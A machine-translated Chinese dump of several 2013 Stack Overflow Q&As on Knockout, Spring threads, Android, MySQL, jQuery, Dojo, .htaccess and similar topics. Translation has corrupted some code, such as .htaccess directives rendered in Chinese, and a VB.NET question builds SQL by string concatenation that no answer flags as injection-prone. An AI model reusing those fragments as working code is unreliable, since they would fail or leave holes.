        var optionsValuePropertyName = allBindingsAccessor().optionsValue;
        var optionsTextPropertyName = allBindingsAccessor().optionsText;
        //Add appropriate class for the typeahead combobox plugin to work
        selectControl.addClass('combobox');
        $.each(options(), function (index, option)
        {
            var value = null;
            var text = null;
            for (var propertyName in option)
            {
                if (propertyName)
                {
                    if (propertyName == optionsValuePropertyName)
                    {
                        value = option[propertyName];
                    }
                    else if (propertyName == optionsTextPropertyName)
                    {
                        text = option[propertyName];
                    }
                }
            }
            if (value && text)
            {
                selectControl.append('<option value=' + value() + '>' + text() + '</option>');
            }
        });
        //Call bootstrap custom combobox plugin on the select control
        selectControl.customcombobox(options());
        //Find the input control that is created by the bootstrap custom combobox plugin to set input control settings like size, style, validation attributes, etc
        var inputControl = selectControl.parent().find('input');
        inputControl.attr('name', selectControl.attr('name'));
        inputControl.attr('data-val', selectControl.attr('data-val'));
        inputControl.attr('data-val-required', selectControl.attr('data-val-required'));
        inputControl.attr('style', selectControl.attr('style'));
        if (inputControl && valueUnwrapped && valueUnwrapped.sizeClass) //Used the sizeClass instead of class itself becasue IE7 was having issues if using class or 'class' for custom bindings.
        {
            inputControl.addClass(valueUnwrapped.sizeClass);
        }        
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-26T08:21:04.447

我假设 RuleReserveWords 是一个淘汰赛可观察数组？在这种情况下，您可以订阅它。当列表更改时，订阅应该触发......

```
viewModel.RuleReserveWords.subscribe(function() { ... list has changed here... }) 
```

# java - 如何可靠地杀死跨服务器的@Scheduled 线程？

> ID：14469057
> 
> 赞同：2
> 
> 时间：2013-01-22T22:14:24.553
> 
> 标签：java, multithreading, tomcat, spring-mvc, blackboard

我正在构建一个作为 Spring MVC 应用程序实现的插件。该插件通过其中一台服务器上的 gui 部署在 3 - 6 台 tomcat 服务器上。插件的每个实例都有一个@Scheduled 方法来收集服务器上的信息并将其存储在中央数据库中。

我的问题是用于卸载插件的 gui 界面使一些 @Scheduled 线程运行。

例如，我有一个具有服务器 1 - 3 的环境。我通过服务器 1 上的 gui 安装并启用插件。现在有 3 个应用程序实例在服务器 1 - 3 上运行 @Scheduled 线程。如果我回到服务器 1 并卸载插件，线程在服务器 1 上被可靠地杀死，但不是服务器 2 或 3。

我已经实现了以下，但行为仍然存在：

```
@Component
public class ContextClosedListener implements ApplicationListener<ContextClosedEvent> {
    @Autowired 
    ThreadPoolTaskExecutor executor;

    @Autowired 
    ThreadPoolTaskScheduler scheduler;

    public void onApplicationEvent(ContextClosedEvent event) {
        scheduler.shutdown();
        executor.shutdown();
    }  
} 
```

此外，我曾考虑将其实现为上下文侦听器而不是 @Scheduled 方法，但出于维护和可扩展性的原因，我宁愿坚持使用 Spring。

我怎样才能在这样的环境中可靠地杀死线程？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T20:23:41.520

我有几个想法。ThreadPoolTask​​Executor 有一个方法 setThreadNamePrefix，它允许你设置线程的前缀。您可以将前缀设置为唯一的，然后在运行时查找并终止这些线程。您也可以使用同一对象上的 setThreadGroup 方法设置线程组，然后停止线程组中的线程。

更好、更安全的解决方案是在您计划的工作中创建一个突破方法。这是停止线程的首选方法，而不是调用 Thread.stop() 的旧“一枪打死”方法。您可以通过设置公共前缀或使用如上所述的线程组来获取对这些 Runnables 的引用。

下一个问题是：如何轻松停止线程？为此，这将取决于您的应用程序是如何实现的。由于我主要处理 Spring MVC 应用程序，我的第一个解决方案是编写一个控制器来处理管理任务。如果这是 JBoss，或者其他一些具有 JMX 的大型应用程序服务器（我相信 Tomcat 可以配置为提供 JMX，但我不认为它是开箱即用的），我可能会编写一个启用 JMX 的 bean 来允许我通过应用服务器控制台停止线程。基本上，给你自己一个触发线程停止的方法。

# actionscript-3 - AS3 预加载外部 swf 不会达到 100%

> ID：14469058
> 
> 赞同：1
> 
> 时间：2013-01-22T22:14:25.797
> 
> 标签：actionscript-3, flash, preloader

我有一个闪存接口文件，我正在尝试使用预加载器加载外部 swf。我的问题是预加载器在尝试播放 swf 之前从未达到 100%。预加载器将显示、计数到一个百分比并消失。然后 swf 在完成加载时仅在第一帧上挂起几秒钟（有时超过 10 秒！）。它最终会开始播放。加载程序达到的百分比是完全随机的。一次可能达到 40%，下一次只有 7%。

我正在将外部 swfs 加载到舞台上名为“visloader”的空movieClip 中。

这是我的加载程序代码：

```
loader= new SWFLoader("nameOfSlide.swf", {container:visloader, autoPlay:false, onProgress:progressHandler, onComplete:completeHandler});

loader.load(); 
```

这是我的进度和完整功能：

```
//--------------PROGRESS HANDLER----------------------------------------------------------------
function progressHandler(e:Event):void{
    //set alpha of loading animation to 1 so it is visible
    progClip.alpha = 1;
    progClip.loadPct.text = "" + Math.floor((loader.bytesLoaded/loader.bytesTotal)*100) + "%";
}

//--------------COMPLETE HANDLER-----------------------------------------------------------------

function completeHandler(e:Event):void{
    //hide the preloader animation
    progClip.alpha = 0;
    //myClip was created in the variables section above to hold the loaded swf
    //must use 'rawContent' to get control over the swf (play/pause, etc...)
    myClip = e.target.rawContent;       

    myClip.play();
} 
```

“progClip”是舞台上的一个movieClip，带有一个旋转的圆圈和一个名为“loadPct”的文本字段。

正在加载的外部 swf 非常大。有些超过 5 MB。不确定这是否重要。我已经为文件稍小的不同客户端使用了完全相同的预加载器，并且没有任何问题。我完全不知所措。

我认为以前没有人问过这个问题。我搜索了论坛并没有想出任何东西。希望这里有人知道我在说什么。

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T20:38:37.533

如果 SWFLoader 过早触发 complete 事件，并且您无法通过查看类本身来了解原因，您可以尝试检查 - 在 progressHandler、EnterFrame 或 Timer 中 - 当 loader.bytesTotal == loader .bytesLoaded。当它发生时，删除相关的侦听器并从那里开始。

Bit of a hack I know but if SWFLoader isn't working properly it's that, repair the class or get another library. I'm gonna have a look at it myself now, for the meantime hope this helps/works!

# android - 打开摩托罗拉 XYBoard 上的手电筒

> ID：14469070
> 
> 赞同：0
> 
> 时间：2013-01-22T22:15:35.580
> 
> 标签：android, android-camera

我正在编写一个应用程序来在我的 Motorola XYBoard 上打开手电筒一段固定的时间。下面是我的一段代码，虽然这段代码适用于摩托罗拉 Attrix 和三星 Galaxy Note 10.1，但它不适用于 XYBoard。我确实检查了支持的闪光模式，手电筒就是其中之一。我已经阅读了有关堆栈溢出的多个讨论，其中其他人遇到了类似的问题，但我没有尝试过任何工作。如果有人帮助我会非常有帮助

公共无效 flashLightOn() {

```
 try {
        if (getPackageManager().hasSystemFeature(
                PackageManager.FEATURE_CAMERA_FLASH)) {

            cam = Camera.open();
            Parameters p = cam.getParameters();
            List<String> abc = p.getSupportedFlashModes();

            for (String a : abc){
                Log.d("mode: ", a);
    }
            p.setFlashMode(Parameters.FLASH_MODE_OFF);
            p.setFlashMode(Parameters.FLASH_MODE_TORCH);

            cam.setParameters(p);
            cam.startPreview();
           /* cam.autoFocus(new AutoFocusCallback() {
                public void onAutoFocus(boolean success, Camera camera) {
                }
            });*/

        } else {

        }
    } catch (Exception e) {
        e.printStackTrace();
        Toast.makeText(getBaseContext(), "Exception flashLightOn()",
                Toast.LENGTH_SHORT).show();
    }
}

public void flashLightOff() {
    try {
        if (getPackageManager().hasSystemFeature(
                PackageManager.FEATURE_CAMERA_FLASH)) {
            cam.stopPreview();
            cam.release();
            cam = null;
        }
    } catch (Exception e) {
        e.printStackTrace();
        Toast.makeText(getBaseContext(), "Exception flashLightOff",
                Toast.LENGTH_SHORT).show();
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T03:06:30.887

您为什么不从 App Store 安装一个 torchlight 应用程序，您的应用程序将只使用一个意图调用该应用程序。

这样编码更少！

# mysql - 3张桌子还是1张桌子？

> ID：14469074
> 
> 赞同：0
> 
> 时间：2013-01-22T22:16:07.847
> 
> 标签：mysql

```
CREATE TABLE IF NOT EXISTS `domains` (
`domains_id` bigint(15) NOT NULL AUTO_INCREMENT,
`domains_url` varchar(255) NOT NULL,
PRIMARY KEY (`domains_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `domains_actions` (
  `domains_actions_id` int(15) NOT NULL AUTO_INCREMENT,
  `domains_actions_selmgec` int(15) NOT NULL,
  `domains_id` int(15) NOT NULL,
  `domains_actions_member` int(15) NOT NULL,
  `domains_actions_date` date NOT NULL,
  `actions_id` int(2) NOT NULL
  `domains_actions_value` int(15) NOT NULL,
  PRIMARY KEY (`domains_actions_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `actions` (
  `actions_id` int(15) NOT NULL AUTO_INCREMENT,
  `actions_action` varchar(15) NOT NULL,
  PRIMARY KEY (`actions_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ; 
```

因此，如果我已正确阅读，我需要一个用于喜欢/新/社交的操作表，然后将其链接到 domain_actions。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T22:17:33.190

不知道你想用这些做什么，但他们显然有重复的数据。您应该合并到一个带有`type`列的表中；也许使用`ENUM`.

```
CREATE TABLE IF NOT EXISTS `domains` (
  `domains_id` int(15) NOT NULL AUTO_INCREMENT,
  `domains_selmgec` int(15) NOT NULL,
  `domains_domain` int(15) NOT NULL,
  `domains_member` int(15) NOT NULL,
  `domains_date` date NOT NULL,
  `domains_type` int(2) NOT NULL,
  `type` ENUM('likes', 'new', 'social'),
  PRIMARY KEY (`domains_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ; 
```

一个更加关系化和规范化的模式看起来像：

```
CREATE TABLE IF NOT EXISTS `domain` (
  `id` int(15) NOT NULL AUTO_INCREMENT,
  `selmgec` int(15) NOT NULL,
  `domain` int(15) NOT NULL,
  `member` int(15) NOT NULL,
  `date` date NOT NULL,
  `type` int(2) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1;

CREATE TABLE IF NOT EXISTS `type` (
  `id` tinyint(1) NOT NULL AUTO_INCREMENT,
  `type` varchar(6) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1;

CREATE TABLE IF NOT EXISTS `domainType` (
  `domain_id` int(15) NOT NULL,
  `type_id` tinyint(1) NOT NULL,
  PRIMARY KEY (`domain_id`, `type_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1; 
```

这种设计将允许您拥有一个域并为其分配多种类型。您需要将引擎更改为`InnoDb`并创建外键约束来强制执行这些类型。

## [查看演示](http://sqlfiddle.com/#!2/bf16c/1)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T22:19:33.390

在不了解所有细节的情况下，我将创建一个表，然后创建一个`TypeId`引用另一个表的列：

```
CREATE TABLE IF NOT EXISTS `domains` (
  `domains_id` int(15) NOT NULL AUTO_INCREMENT,
  `domains_selmgec` int(15) NOT NULL,
  `domains_domain` int(15) NOT NULL,
  `domains_member` int(15) NOT NULL,
  `domains_date` date NOT NULL,
  `domains_type` int(2) NOT NULL,
  `type_id` int(2) NOT NULL,
  PRIMARY KEY (`domains_likes_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

CREATE TABLE IF NOT EXISTS `types` (
  `type_id` int(15) NOT NULL AUTO_INCREMENT,
  `type_name` varchar(15) NOT NULL,
  PRIMARY KEY (`type_id`)
) ; 
```

# java - 在 IReport 设计器中使用自定义对象列表

> ID：14469079
> 
> 赞同：0
> 
> 时间：2013-01-22T22:16:25.683
> 
> 标签：java, collections, ireport

使用自定义对象列表创建报告的正确方法是什么？我一直在尝试实现这一目标一两天，但没有任何效果。我创建了一个自定义 JRDataSource 和一个创建此类对象的工厂。

这是数据源的代码：

```
public class ViajeDataSource implements JRDataSource
{

private int index;
private ArrayList<Viaje> viajes;

public ViajeDataSource()
{
    this.viajes=new ArrayList<>();
}

@Override
public boolean next() throws JRException 
{
    this.index++;
    return (index<this.viajes.size());
}

@Override
public Object getFieldValue(JRField jrf) throws JRException 
{
    Object value = null;
    Viaje viaje=this.viajes.get(this.index);
    if (jrf.getName().equals("FECHA"))
    {
        return viaje.getFecha();
    }
    switch(jrf.getName())
    {
        case "FECHA":
            value=viaje.getFecha();
            break;
        case "NombrePersona":
            value=viaje.getNombrePersona();
            break;
        case "NombreEmpresa":
            value=viaje.getNombreEmpresa();
            break;
        case "Observacion":
            value=viaje.getObservacion();
            break;
        case "Importe":
            value=viaje.getTarifa();
            break;
        case "Demora":
            value=viaje.getDemora();
            break;
        case "Total":
            value=viaje.getTotal();
            break;
        case "Peaje":
            value=viaje.getPeaje();
            break;
    }
    return value;
} 
```

注意字段名为**`FECHA`** 我在IReport设计器中添加了以下表达式：`$F{FECHA}`，但是在预览时，IDE说没有`FECHA`找到“”字段。任何想法为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-26T11:37:05.687

这种方法对我有用：我创建了一个自定义 dataSourceProvider，而不是自定义数据源，并在创建数据源时选择了 JRDataSource。这与 IReports 独立实用程序相结合，使我能够使用我的集合中的示例数据设计报告

# c# - C# 和 Windows 窗体中是否有任何与 PostMessage 对应的内容？

> ID：14469083
> 
> 赞同：1
> 
> 时间：2013-01-22T22:16:48.617
> 
> 标签：c#, winforms

我有一个显示多个工作线程结果的窗口，但我的工作线程应该没有中断（几乎）工作，所以我想将我的通知数据发布到我目前正在使用的主窗口，`BeginInvoke`但它有问题！我应该打电话`EndInvoke`，但在哪里？我应该创建另一个线程来服务这个？另一种选择是`PostMessage`直接使用，但由于我正在学习使用`.NET`我更喜欢`.NET`解决方案而不是平台调用（如果可用）。那么我应该怎么做才能在不阻塞我的工作线程的情况下向主线程发布一些东西呢？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-22T22:22:06.533

您应该简单地使用`BeginInvoke`，这与发布消息的直接等效。`EndInvoke`除非您对返回值感兴趣，否则您根本不需要调用。

如果您*对*返回值感兴趣，那么“我在哪里可以做”的答案`EndInvoke`很明显：在您需要返回值以继续之前的最后一刻调用它。

# java - 在图像中查找隐藏文件（视频文件）

> ID：14469084
> 
> 赞同：0
> 
> 时间：2013-01-22T22:16:55.920
> 
> 标签：java, python, image, hidden-files

我有一个文件，它是 JPEG 格式的图像。我想知道它是否有隐藏内容（视频文件）。在这种特定情况下，我可以尝试找到隐藏的内容（视频文件）吗？我们可以假设它不是一种将数据隐藏到图像本身的方法，即它不会改变图像数据本身的任何位。

我昨天问的相关问题已关闭：[如何在图像文件中找到隐藏文件（Jpg/Gif/Png）](https://stackoverflow.com/questions/14451109/how-to-find-hidden-files-inside-image-files-jpg-gif-png)

隐藏文件可以在图像的前面或尾部。我愿意逐位检查图像或任何其他可能提供高精度的方法，即使不是 100%

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T00:00:08.810

如果您有一个被识别为 JPEG 的文件，则隐藏文件不能位于其前面。否则，将标识其他文件代替 JPEG。因此，您需要做的就是找到 JPEG 的结束位置。如果它在文件末尾结束，那么您没有隐藏文件。

这是一种查找 JPEG 结束位置的方法（由 EOI 标签指示——图像结束，0xffd9）。请注意，JPEG 中可能包含 JPEG，因此为了使其更加健壮，您还必须处理 SOI 标记——图像开始 (0xffd8)。

```
import sys

data = open(sys.argv[1]).read()

eoi_start = False
for i, c in enumerate(data):
    if ord(c) == 0xff:
        eoi_start = True
    elif ord(c) == 0xd9 and eoi_start:
        print 'JPEG ends at byte %d' % (i + 1)
        break
    else:
        eoi_start = False

print 'Total size: %d' % len(data) 
```

# jquery - 使用带有变量和多个标识符的 .load()

> ID：14469085
> 
> 赞同：0
> 
> 时间：2013-01-22T22:17:02.193
> 
> 标签：jquery, load

好的，这是我 jQuery 的快速入门

```
var uid = $('#mem_week a').attr('href');
$('#usersImg').load(uid #profile-advanced-right img); 
```

不太确定我是否可以`uid`像这样在 .load() 中编写 var，另外我需要具体说明 id`#profile-advanced-right img`这可能吗？如果没有，有人可以展示我将如何写这个吗？>

生成标记::

```
<div id="mem_week">
 <h3>
  <a href="/u1">Mr.EasyBB</a>
 </h3>
   <div id="usersImg"></div>
 </div> 
```

这只是一个基本的标记。真的，我正在尝试从 div 的 url /u1 中获取用户图像，`#profile-advanced-right .main-content img`就好像出来应该是

```
<div id="mem_week">
 <h3>
  <a href="/u1">Mr.EasyBB</a>
 </h3>
   <div id="usersImg">
     <img src="usersimg.png"/>
   </div>
 </div> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T22:19:08.220

关。这就是你想要的：

```
$('#usersImg').load(uid + " #profile-advanced-right img"); 
```

您可以通过阅读 jQuery[`load()`](http://api.jquery.com/load/)文档发现这一点。在 SO 上提问之前检查文档通常是个好主意。:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-22T22:26:31.207

所以 load 基本上和这个做同样的事情：

```
$.get(url).done(function(htmlFragment){ //get the html fragment at this url (it will be a string)
  $('#myElement').html(htmlFragment); //set the contents of your element to that html fragment
}); 
```

换句话说，它是更复杂概念的辅助方法。通过我的阅读，您想要的是在返回的片段中选择一个 img 并将其粘贴到您的元素中

```
var url = $('#mem_week a').attr('href');
$.get(url).done(function(htmlFragment){ //get the html fragment at this url (it will be a string)
   //parse the string with jquery and navigate to that node
  var justTheImg = $(htmlFragment).find('#profile-advanced-right img');
  //set the contents of your element to that img (using the html method might also work)
  $('#myElement').append(justTheImg); 
}); 
```

# cocoa - NSOpenPanel 行为怪异

> ID：14469093
> 
> 赞同：0
> 
> 时间：2013-01-22T22:17:44.560
> 
> 标签：cocoa, nsopenpanel

我正在尝试使用 NSOpenPanel 来打开打开文件页面。它在大多数情况下都可以正常工作，除了 3 件事：

1.  第一个问题是侧边栏没有出现，虽然我仍然可以点击它。

2.  第二个问题是，当我切换到一个文件比以前少的文件夹时，屏幕没有被清除，并且以前的一些文件仍然出现，尽管它们不可点击。

3.  当我尝试切换到列视图时，应用程序崩溃。但是所有其他 3 个视图都可以正常工作。

这是崩溃日志：

```
AppKit`-[NSTableView setVerticalMotionCanBeginDrag:]:
0x7fff91d4f899:  pushq  %rbp
0x7fff91d4f89a:  movq   %rsp, %rbp
0x7fff91d4f89d:  movq   7385076(%rip), %rax       ; TrustKeychains::systemKcHandle() + 92
0x7fff91d4f8a4:  movq   (%rax,%rdi), %rax
0x7fff91d4f8a8:  movq   7385193(%rip), %rcx       ; tp_policyTrustSettingParams + 92
0x7fff91d4f8af:  movl   $4292870143, %edi
0x7fff91d4f8b4:  andl   (%rax,%rcx), %edi   <- Crash points here with EXC_BAD_ACCESS (code=1, address = 0x18)
0x7fff91d4f8b7:  shll   $21, %edx
0x7fff91d4f8ba:  andl   $2097152, %edx
0x7fff91d4f8c0:  addl   %edi, %edx
0x7fff91d4f8c2:  movl   %edx, (%rax,%rcx)
0x7fff91d4f8c5:  popq   %rbp
0x7fff91d4f8c6:  ret 
```

崩溃日志说崩溃发生在线程 1 中。

我想知道是否有人知道如何解决它。这是我的代码

```
-(IBAction)openDialog:(id)sender{
NSWindow *window = [[viewArray objectAtIndex:currentIndex] window];

NSOpenPanel *openDialog = [NSOpenPanel openPanel];
[openDialog setCanChooseFiles:YES];
[openDialog setCanChooseDirectories:NO];
NSString *homeString = [NSString stringWithFormat:@"file://localhost%@",NSHomeDirectory()];
[openDialog setDirectoryURL:[NSURL URLWithString:homeString]];
NSArray *fileTypes = [[NSArray alloc] initWithObjects:@"xcodeproj", nil];
[openDialog setAllowedFileTypes:fileTypes];

[openDialog beginSheetModalForWindow:window completionHandler:^(NSInteger result){
    if (result == NSFileHandlingPanelOKButton){
        NSURL *doc = [openDialog URL];
        [[NSWorkspace sharedWorkspace] openFile:[doc relativePath]];
    }
}]; 
```

}

我将完全相同的代码放在不同的 XCode 项目中，它工作得很好，所以我不太确定问题出在哪里。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T06:17:46.317

I found the problem. It turns out in my project I had redefined NSTableView and that was causing all the errors.

# asp.net-mvc - TeamCity 使用多个项目 ASP.NET MVC 构建 Web 解决方案

> ID：14469094
> 
> 赞同：1
> 
> 时间：2013-01-22T22:17:47.810
> 
> 标签：asp.net-mvc, msbuild, teamcity

我有一个我认为是 ASP.NET MVC 3 解决方案的非常常见的场景。它有一个 WEB 项目和一个 DAL 类库。我在类库中拥有我所有的数据访问权限，这需要在 web 项目之前构建。

当我在标准 Visual Studio 中重建我的解决方案时，我没有任何问题。但是假设我进行了数据更改（例如对数据库）并签入 DBML（LINQ to SQL）文件和来自 WEB 项目的相应参考文件。

我看到的是 TeamCity 根本没有清理/重建类库 DLL。以下是我的解决方案配置。我如何强制 TeamCity 重建每个项目，因为它似乎没有这样做。我必须在本地实际签入 bin/debug DLL，以便 TeamCity 成功构建。我觉得不应该这样。我是否需要为每个项目设置一个构建步骤...？

![在此处输入图像描述](../Images/fa4aefe267495a9a3e3d496cc7ba2c2b.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-23T00:52:03.137

> 我如何强制 TeamCity 重建每个项目，因为它似乎没有这样做。

我认为最可靠的方法是在每次构建之前强制对源代码树进行干净签出。（另见：从轨道上对其进行核打击。）

您可以通过启用*Version Control Settings* -> *Checkout Settings*`Clean all files before build`上的选项让 TeamCity 为您执行此操作。此选项会删除整个签出目录，并在构建之前对所有源进行完整、干净的签出。TeamCity ['Clean Checkout'](http://confluence.jetbrains.net/display/TCD7/Clean+Checkout)文档有更多信息。

 *** * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T02:39:11.533

听起来您的构建配置（在 Visual Studio 中）搞砸了。

首先，确保您的 DAL 引用是项目引用，而不是文件引用。

更正此问题的最简单方法是删除引用并重新添加它。添加时，请确保您正在查看项目选项卡。这应该重置项目依赖项。

要确保 MVC 项目依赖于 DAL 项目，请右键单击 MVC 项目并从上下文菜单中选择*Project Dependencies...。*应检查 DAL 项目。**

# xcode - UIImageJPEGRepresentation 和糟糕的图像

> ID：14469097
> 
> 赞同：0
> 
> 时间：2013-01-22T22:17:51.443
> 
> 标签：xcode, image, uiimagejpegrepresentation

尝试后，我能够将从相机拍摄的图像上传到我的网络服务器。

但我不明白为什么图像质量很差，分辨率低，颜色很少。有没有办法获得更好的质量？

这是我的代码：

```
NSURL *url = [NSURL URLWithString:@"http://localhost"];

    AFHTTPClient *httpClient = [[AFHTTPClient alloc] initWithBaseURL:url];

    NSData *imageData = UIImageJPEGRepresentation(image, 0.9);

    NSMutableURLRequest *request = [httpClient multipartFormRequestWithMethod:@"POST" path:@"/upload.php" parameters:nil constructingBodyWithBlock: ^(id <AFMultipartFormData>formData) {
        [formData appendPartWithFileData:imageData name:@"file" fileName:@"temp.jpeg" mimeType:@"image/jpeg"];
    }];

    AFHTTPRequestOperation *operation = [[AFHTTPRequestOperation alloc] initWithRequest:request];

    [operation setUploadProgressBlock:^(NSUInteger bytesWritten, long long totalBytesWritten, long long totalBytesExpectedToWrite) {
        NSLog(@"Sent %lld of %lld bytes", totalBytesWritten, totalBytesExpectedToWrite);
    }];

    [operation setCompletionBlockWithSuccess:^(AFHTTPRequestOperation *operation, id responseObject)
    {
        NSString *response = [operation responseString];
        NSLog(@"response: [%@]",response);
        //[MBProgressHUD hideHUDForView:self.view animated:YES];
    }
    failure:^(AFHTTPRequestOperation *operation, NSError *error)
    {
        //[MBProgressHUD hideHUDForView:self.view animated:YES];
        if([operation.response statusCode] == 403)
        {
            NSLog(@"Upload Failed");
            return;
        }
        NSLog(@"error: %@", [operation error]);

    }];

    [operation start]; 
```

谢谢瑞吉斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T15:30:32.050

Sorry guys in order to work on my webserver I use realVnc. The set up of RealVnc was set to low resolution !!! I did change setup to have a better resolution and now the problem is solved!

# vb.net - 选择多列时出现 ExecuteReader 错误“行/列不存在数据”

> ID：14469098
> 
> 赞同：1
> 
> 时间：2013-01-22T22:17:53.417
> 
> 标签：vb.net, sql-server-ce

我正在尝试运行一个返回三列的简单查询，但遇到了一个错误，指出数据不存在，尽管我很确定它确实存在。

这是有问题的代码部分。

```
 cmd.CommandText = "SELECT school.id, school.city, school.state 
                           FROM school,city
                           WHERE school.name = '" & SchoolLb.SelectedItem & "'
                           AND city.name = '" & CityLb.SelectedItem & "';"

        'MessageBox.Show(cmd.ExecuteScalar)
        myReader = cmd.ExecuteReader
        profileSchool = myReader(0)
        profileCity = myReader(1)
        profileState = myReader(2) 
```

学校列表框填充了当前在城市列表框中选择的城市中的学校，因此它们匹配。`MessageBox.Show(cmd.ExecuteScalar)`当我从运行中删除注释标签`ExecuteScalar`并返回一条显示正确记录 ID 的消息时。但是，使用时`cmd.ExecuteReader`出现上述错误。

感谢您的关注。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T22:23:23.737

您需要执行阅读器，然后使用以下命令将其推进到下一条记录[`reader.Read()`](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqldatareader.read.aspx)：

```
Using reader = cmd.ExecuteReader()
    reader.Read()
    profileSchool = reader(0)
    profileCity = reader(1)
    profileState = reader(2)
End Using 
```

# javascript - Dojo 对话框显示为静态网页

> ID：14469100
> 
> 赞同：1
> 
> 时间：2013-01-22T22:17:59.690
> 
> 标签：javascript, dojo, dialog

我正在尝试编写一个 Dojo 对话框的简单示例。我在这里复制了 Dojo 参考中显示的示例 => [http://dojotoolkit.org/reference-guide/1.7/dijit/Dialog.html](http://dojotoolkit.org/reference-guide/1.7/dijit/Dialog.html)

我的代码如下所示：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
        <title>Dialog Test</title>
        <script language="JavaScript" type="text/javascript">
                dojo.require("dojo.parser");
                dojo.require("dojox.widget.Dialog");
                dojo.require("dijit.form.Button");
                dojo.require("dijit.layout.TabContainer")
                dojo.require("dijit.layout.ContentPane")
        </script>
    </head>
    <body>
        <div id="dialogOne" dojoType="dojox.widget.Dialog" title="My Dialog Title">
            <div dojoType="dijit.layout.TabContainer" style="width: 200px; height: 300px;">
                <div dojoType="dijit.layout.ContentPane" title="foo">Content of Tab "foo"</div>
                <div dojoType="dijit.layout.ContentPane" title="boo">Hi, I'm Tab "boo"</div>
            </div>
        </div>
        <p>When pressing this button the dialog will popup:</p>
        <button id="buttonOne" dojoType="dijit.form.Button">Show me!
            <script type="dojo/method" event="onClick" args="evt">
                // Show the Dialog:
                dijit.byId("dialogOne").show();
            </script>
        </button>
    </body>
</html> 
```

当页面在浏览器中加载时，对话框不起作用。我只是看到选项卡式窗格中的文本出现在浏览器中。

我已经完全复制了参考指南中的代码，所以我很困惑。有什么建议么？

谢谢。

詹姆士。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-24T16:53:52.900

不幸的是，Dojo 样本往往不能完全“按原样”工作，而是需要用各种标准的仪式来包装的一些骨架代码。

您至少有三件事导致它无法正常工作和渲染。上面可能还有其他问题，但这些*肯定会*导致它无法渲染：

1.  您需要链接到核心 Dojo 脚本的一个版本。链接到 CDN 版本是一种简单的方法。例如`<script src="//ajax.googleapis.com/ajax/libs/dojo/1.8.3/dojo/dojo.js"></script>`。详细信息在这里：[http](http://dojotoolkit.org/download/) ://dojotoolkit.org/download/ 。请务必将其放在您的`require`脚本之前。
2.  在页面中添加指向 Dijit 主题样式表（CSS 文件）的链接，否则任何小部件都无法正确显示。例如`<link rel="stylesheet" type="text/css" href="http://ajax.googleapis.com/ajax/libs/dojo/1.8.3/dijit/themes/claro/claro.css‌​"/>`
3.  在 body 元素上添加一个`class`属性，描述您要使用的主题。例如`<body class="claro">`。

只有当你完成了所有这三件事时，它才有机会工作。可能还有其他问题，但它们是基本的三个。

# php - .htaccess 规则在转发真实 404 时删除 .php

> ID：14469101
> 
> 赞同：0
> 
> 时间：2013-01-22T22:18:02.007
> 
> 标签：php, apache, .htaccess

> **可能重复：**
> [使用 .htaccess 删除 .php 扩展名](https://stackoverflow.com/questions/4026021/remove-php-extension-with-htaccess)

我对.htaccess 知之甚少，我想要完成的是两方面的。

1.  允许使用或不使用 .php 以及使用或不使用尾部斜杠来调用对 .php 的请求。例如。

    `/profile.php` *作品*
    `/profile` *追加.php，作品*
    `/profile/` *追加.php所以它工作*

2.  如果尝试上述操作后文件或目录不存在，则视为404并重定向到另一个页面。

    `/something` *失败，重定向到 /404.php?id=$1（请求的 url）*

我有两个单独工作的规则，但我需要对这些规则或其他东西进行条件化。任何意见，将不胜感激。

```
重写引擎开启

# 这适用于 PHP 部分。
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
重写规则 ^([^/]*)/?$ $1.php

# 这适用于一般的 404 处理
RewriteBase /
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
重写规则 ^(.*)$ /404.php?url=http://%{HTTP_HOST}/$1 [L]

```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T15:32:58.593

Apache 会自动将 .php 附加到`/profile`并且`/profile/`不附加任何 mod_rewrite。您唯一应该处理的是 404 页面。

```
RewriteEngine on
RewriteBase /
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ /404.php?url=http://%{HTTP_HOST}/$1 [L] 
```

但是，如果由于某种原因无法正常工作（例如 apache 配置不正确）：

```
RewriteEngine on
RewriteBase /
